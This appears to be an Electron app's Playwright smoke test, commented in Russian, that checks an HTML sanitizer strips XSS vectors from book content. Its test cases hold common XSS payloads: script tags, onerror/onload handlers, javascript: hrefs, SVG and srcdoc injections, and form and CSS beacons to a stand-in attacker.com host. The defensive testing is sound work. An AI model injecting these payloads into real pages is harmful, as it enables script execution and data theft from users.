/**
 * tests/smoke/sanitize-xss.test.ts
 *
 * Smoke-тест на реальную DOM-based санитизацию HTML в renderer'е.
 * Pure-helper тесты renderer/sanitize.js (`isSafeUrl`, `isAllowedAttr`,
 * `TAG_ALLOWLIST`, `URL_SCHEME_ALLOWLIST`) уже покрыты в
 * tests/renderer-sanitize.test.ts. Но сама функция `sanitizeHtml` использует
 * `DOMParser` + `parseFromString` + DOM walker — это browser-only API,
 * pure-unit его не покрывает.
 *
 * Этот spec закрывает гэп: загружает sanitize.js через dynamic ES-module
 * import в реальном renderer'е (Playwright), прогоняет реалистичные
 * XSS-payloads и проверяет что результат:
 *   - НЕ содержит script/iframe/object/style/svg/form элементов
 *   - НЕ содержит on*/srcdoc/style/formaction атрибутов
 *   - НЕ содержит javascript:/file:/data:text/html href/src
 *   - <a target=_blank> принудительно получает rel=noopener noreferrer
 *
 * Без этого теста любой регресс в `walk()` или `KILL_WHOLE` set'е приводит
 * к XSS-surface через book.md content в reader'е.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import * as os from "node:os";
import * as path from "node:path";
import * as fs from "node:fs";
import { fileURLToPath } from "node:url";
import { mkdtemp, rm } from "node:fs/promises";
import { _electron as electron } from "playwright";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT = path.resolve(__dirname, "..", "..");
const MAIN_PATH = path.join(ROOT, "dist-electron", "main.js");
const PRELOAD_PATH = path.join(ROOT, "dist-electron", "preload.js");

function assertElectronBuilt(): void {
  if (!fs.existsSync(MAIN_PATH) || !fs.existsSync(PRELOAD_PATH)) {
    throw new Error(
      `Electron build not found. Run \`npm run electron:compile\` first.\n` +
        `Missing: ${!fs.existsSync(MAIN_PATH) ? MAIN_PATH : PRELOAD_PATH}`,
    );
  }
}

test("[smoke/sanitize] sanitizeHtml strips XSS vectors end-to-end via real DOMParser", async (t) => {
  assertElectronBuilt();

  const userData = await mkdtemp(path.join(os.tmpdir(), "bibliary-smoke-sanitize-"));
  const dataDir = path.join(userData, "data");
  fs.mkdirSync(dataDir, { recursive: true });
  fs.writeFileSync(
    path.join(dataDir, "preferences.json"),
    JSON.stringify({ version: 1, prefs: { onboardingDone: true, onboardingVersion: 999 } }),
    "utf-8",
  );

  const app = await electron.launch({
    args: [MAIN_PATH],
    env: {
      ...process.env,
      BIBLIARY_DATA_DIR: dataDir,
      BIBLIARY_LIBRARY_DB: path.join(dataDir, "bibliary-cache.db"),
      BIBLIARY_LIBRARY_ROOT: path.join(dataDir, "library"),
      ELECTRON_USER_DATA: userData,
      BIBLIARY_SMOKE_UI_HARNESS: "1",
    },
    timeout: 30_000,
  });

  t.after(async () => {
    try { await app.close(); } catch { /* ignore */ }
    await rm(userData, { recursive: true, force: true });
  });

  const window = await app.firstWindow({ timeout: 20_000 });
  await window.waitForLoadState("domcontentloaded");

  /* sanitize.js — ES module в renderer/. Renderer loaded from file:// поэтому
     import("./sanitize.js") резолвится относительно index.html. Грузим один
     раз, гоняем все payload'ы внутри одного evaluate чтобы избежать N
     отдельных round-trip'ов. */
  const results = await window.evaluate(async () => {
    /* @vite-ignore */
    /* eslint-disable-next-line @typescript-eslint/no-explicit-any */
    const mod: any = await import("./sanitize.js");
    const sanitizeHtml: (html: string) => string = mod.sanitizeHtml;
    if (typeof sanitizeHtml !== "function") {
      throw new Error("sanitizeHtml not exported from renderer/sanitize.js");
    }

    /* helper: проверяет что в результате нет тега / атрибута / подстроки. */
    const hasTag = (html: string, tag: string): boolean => {
      const tmp = document.createElement("div");
      tmp.innerHTML = html;
      return tmp.querySelector(tag) !== null;
    };
    const hasAttr = (html: string, attr: string): boolean => {
      const tmp = document.createElement("div");
      tmp.innerHTML = html;
      const all = tmp.querySelectorAll("*");
      for (const el of Array.from(all)) {
        if (el.hasAttribute(attr)) return true;
      }
      return false;
    };

    /* Каждый payload — отдельный case с метой checkpoints. */
    const cases: Array<{ name: string; input: string; check: (out: string) => string | null }> = [
      {
        name: "<script> tag stripped",
        input: '<p>Hello</p><script>alert(1)</script><p>World</p>',
        check: (out) => hasTag(out, "script") ? "script tag survived" : null,
      },
      {
        name: "<img onerror> attr removed",
        input: '<img src="x" onerror="alert(1)">',
        check: (out) => hasAttr(out, "onerror") ? "onerror attr survived" : null,
      },
      {
        name: "<img onload> attr removed",
        input: '<img src="x" onload="alert(1)">',
        check: (out) => hasAttr(out, "onload") ? "onload attr survived" : null,
      },
      {
        name: '<a href="javascript:..."> stripped href',
        input: '<a href="javascript:alert(1)">click</a>',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const a = tmp.querySelector("a");
          if (a && a.hasAttribute("href")) return `javascript: href survived: ${a.getAttribute("href")}`;
          return null;
        },
      },
      {
        name: '<a href="vbscript:..."> stripped',
        input: '<a href="vbscript:msgbox(1)">x</a>',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const a = tmp.querySelector("a");
          return a?.hasAttribute("href") ? "vbscript: href survived" : null;
        },
      },
      {
        name: "<iframe> killed entirely",
        input: '<p>before</p><iframe src="https://x"></iframe><p>after</p>',
        check: (out) => hasTag(out, "iframe") ? "iframe survived" : null,
      },
      {
        name: "<object> killed",
        input: '<object data="x.swf"></object>',
        check: (out) => hasTag(out, "object") ? "object survived" : null,
      },
      {
        name: "<embed> killed",
        input: '<embed src="x.swf">',
        check: (out) => hasTag(out, "embed") ? "embed survived" : null,
      },
      {
        name: "<form> + <input> + <button> killed",
        input: '<form action="https://attacker.com" method="post"><input name="x"><button>go</button></form>',
        check: (out) => {
          if (hasTag(out, "form")) return "form survived";
          if (hasTag(out, "input")) return "input survived";
          if (hasTag(out, "button")) return "button survived";
          return null;
        },
      },
      {
        name: "<svg> killed (SVG XSS vector)",
        input: '<svg><script>alert(1)</script><circle cx="5" cy="5" r="3"/></svg>',
        check: (out) => {
          if (hasTag(out, "svg")) return "svg survived";
          if (hasTag(out, "script")) return "embedded script survived";
          return null;
        },
      },
      {
        name: "<style> killed (CSS injection)",
        input: '<style>body{background:url(https://attacker.com/leak)}</style><p>x</p>',
        check: (out) => hasTag(out, "style") ? "style survived" : null,
      },
      {
        name: "style attribute removed",
        input: '<p style="background:url(https://attacker.com/leak)">x</p>',
        check: (out) => hasAttr(out, "style") ? "style attr survived" : null,
      },
      {
        name: "srcdoc attribute removed",
        input: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        check: (out) => {
          if (hasTag(out, "iframe")) return "iframe survived";
          if (hasAttr(out, "srcdoc")) return "srcdoc survived";
          return null;
        },
      },
      {
        name: "<img src='data:image/svg+xml,...'> stripped src",
        input: '<img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;">',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const img = tmp.querySelector("img");
          if (img && img.hasAttribute("src")) {
            const src = img.getAttribute("src") ?? "";
            if (src.startsWith("data:image/svg")) return "svg data URI src survived";
          }
          return null;
        },
      },
      {
        name: "<a target='_blank'> gets rel='noopener noreferrer'",
        input: '<a href="https://example.com" target="_blank">link</a>',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const a = tmp.querySelector("a");
          if (!a) return "anchor disappeared (should remain)";
          const rel = a.getAttribute("rel") ?? "";
          if (!rel.includes("noopener")) return `noopener missing in rel='${rel}'`;
          if (!rel.includes("noreferrer")) return `noreferrer missing in rel='${rel}'`;
          return null;
        },
      },
      {
        name: "<a href='https://x'> kept as-is (legit external link)",
        input: '<a href="https://example.com/page">x</a>',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const a = tmp.querySelector("a");
          if (!a) return "legit https anchor was unwrapped";
          if (a.getAttribute("href") !== "https://example.com/page") {
            return `href changed: '${a.getAttribute("href")}'`;
          }
          return null;
        },
      },
      {
        name: "<img src='bibliary-asset://sha256/...'> kept (CAS allowed)",
        input: `<img src="bibliary-asset://sha256/${"a".repeat(64)}" alt="x">`,
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const img = tmp.querySelector("img");
          if (!img) return "bibliary-asset img dropped";
          if (!img.getAttribute("src")?.startsWith("bibliary-asset://")) {
            return `bibliary-asset src changed: ${img.getAttribute("src")}`;
          }
          return null;
        },
      },
      {
        name: "<img src='data:image/png;base64,...'> kept (PNG data URI allowed)",
        input: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSU=" alt="x">',
        check: (out) => {
          const tmp = document.createElement("div");
          tmp.innerHTML = out;
          const img = tmp.querySelector("img");
          if (!img) return "img dropped";
          if (!img.getAttribute("src")?.startsWith("data:image/png")) {
            return `png data URI src changed: ${img.getAttribute("src")}`;
          }
          return null;
        },
      },
      {
        name: "ordinary markdown-like HTML survives intact",
        input: '<h1>Title</h1><p>Body with <strong>bold</strong> and <em>italic</em>.</p><pre><code>code()</code></pre>',
        check: (out) => {
          if (!hasTag(out, "h1")) return "h1 dropped";
          if (!hasTag(out, "strong")) return "strong dropped";
          if (!hasTag(out, "em")) return "em dropped";
          if (!hasTag(out, "code")) return "code dropped";
          return null;
        },
      },
      {
        name: "nested malicious within allowed structure",
        input: '<div><p>Safe</p><script>bad()</script><p>More safe</p><img onerror="bad()" src="x"></div>',
        check: (out) => {
          if (hasTag(out, "script")) return "nested script survived";
          if (hasAttr(out, "onerror")) return "nested onerror survived";
          /* But the <p>Safe</p> и <p>More safe</p> должны остаться. */
          if (!out.includes("Safe")) return "safe content dropped";
          if (!out.includes("More safe")) return "More safe content dropped";
          return null;
        },
      },
      {
        name: "case-insensitive event handlers (ONERROR, OnLoad) тоже удаляются",
        input: '<img src="x" ONERROR="bad()" OnLoad="bad()">',
        check: (out) => {
          if (hasAttr(out, "onerror")) return "ONERROR survived";
          if (hasAttr(out, "onload")) return "OnLoad survived";
          return null;
        },
      },
    ];

    const failures: string[] = [];
    for (const c of cases) {
      try {
        const out = sanitizeHtml(c.input);
        const fail = c.check(out);
        if (fail) failures.push(`[${c.name}] ${fail} | output: ${out.slice(0, 150)}`);
      } catch (err) {
        failures.push(`[${c.name}] threw: ${err instanceof Error ? err.message : String(err)}`);
      }
    }
    return { total: cases.length, failures };
  });

  if (results.failures.length > 0) {
    assert.fail(
      `sanitizeHtml failed ${results.failures.length}/${results.total} XSS vector tests:\n` +
        results.failures.map((f) => `  - ${f}`).join("\n"),
    );
  }
  assert.equal(results.failures.length, 0, `all ${results.total} XSS vectors sanitized correctly`);
});
